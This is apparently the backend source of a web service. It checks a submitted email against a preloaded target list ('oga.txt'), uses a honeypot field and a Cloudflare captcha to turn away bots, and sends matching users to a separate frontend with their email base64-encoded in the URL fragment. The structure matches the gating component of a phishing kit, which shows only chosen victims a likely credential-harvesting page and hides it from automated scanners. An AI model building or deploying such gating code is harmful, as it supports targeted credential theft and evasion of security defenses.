require('dotenv').config();

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const fetch = require('node-fetch');
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 3000;
const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');

// ✅ The base for redirect links (points to the frontend)
const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://frontend-production-05bd.up.railway.app';

let validEmails = new Set();
function loadEmails() {
  try {
    const data = fs.readFileSync(EMAIL_FILE, 'utf8');
    validEmails = new Set(data.split('\n').map(e => e.trim().toLowerCase()));
    console.log('[INFO] Email list loaded into memory');
  } catch (err) {
    console.error('[ERROR] Failed to read email list:', err);
  }
}
loadEmails();

const limiter = rateLimit({
  windowMs: 60 * 1000,
  max: 50,
  message: { valid: false, message: 'Too many requests, try again later.' },
});

app.use(cors({
  origin: 'https://frontend-production-05bd.up.railway.app'
}));
app.use(express.json());
app.use(limiter);

app.post('/api/check-email', async (req, res) => {
  const { email, captchaToken, middleName } = req.body;

  if (middleName && middleName.trim() !== '') {
    return res.status(403).json({ valid: false, message: 'Bot activity detected' });
  }

  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ valid: false, message: 'Invalid email format' });
  }

  if (!captchaToken) {
    return res.status(400).json({ valid: false, message: 'Captcha missing' });
  }

  try {
    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `secret=${process.env.CLOUDFLARE_SECRET}&response=${captchaToken}`,
    });

    const verifyData = await verifyRes.json();
    if (!verifyData.success) {
      return res.status(400).json({ valid: false, message: 'CAPTCHA failed. Reload page' });
    }
  } catch (err) {
    return res.status(500).json({ valid: false, message: 'Captcha verification error' });
  }

  const normalizedEmail = email.toLowerCase();
  if (!validEmails.has(normalizedEmail)) {
    return res.status(404).json({ valid: false, message: 'Email not recognized' });
  }

  // ✅ Encode and send redirect URL
 const encoded = Buffer.from(normalizedEmail).toString('base64');
const redirectUrl = `${REDIRECT_BASE}#${encoded}`;
return res.json({ valid: true, redirectUrl });
});

app.listen(PORT, () => {
  console.log(`Backend running on http://localhost:${PORT}`);
});
